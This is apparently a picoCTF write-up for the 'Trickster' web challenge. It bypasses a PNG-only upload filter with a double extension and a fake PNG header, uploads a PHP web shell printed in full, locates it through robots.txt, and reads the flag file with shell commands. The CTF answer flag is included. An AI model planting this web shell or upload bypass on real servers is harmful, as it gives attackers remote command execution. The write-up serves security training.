# Trickster

#### Challenge :&#x20;

<figure><img src="../../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Let's Start !

First visit the website and we have a Simple PNG processing app page in here we only uploads `.png` image  !

<figure><img src="../../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

Check The Source Code of the Web page and We got `type="file" , accept=".png"` in here we only upload `.png` file !

<figure><img src="../../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

Let's Try To upload a `cmd.php` file but error come :\
\
Error. File name does not contain `".png"` !

<figure><img src="../../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

Let's Change the file name `cmd.php` to `cmd.png.php` \
and add the signature of the `.png` image like `PNG` in starting of the Payload !

```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

<figure><img src="../../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

After Some changes We upload the file and finally our payload file is upload succesfully !

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

After Uploading we don't no the correct path of the image where the file is upload then i try to enumerate the robots.txt and we got two disallow entry and our path of file is something `/uploads/cmd.png.php`

<figure><img src="../../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

In correct Path we got the `php` executing php shell where we use linux command easily !

<figure><img src="../../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Let's FInd the all `.txt` file using find command !!\
We got some intresting file called `/var/www/html/G4ZTCOJYMJSDS.txt` in root directory of web server !!&#x20;

<figure><img src="../../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

```
cat /var/www/html/G4ZTCOJYMJSDS.txt
```

Finally We got a Flag !!!!

<figure><img src="../../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>



```
Flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}
```
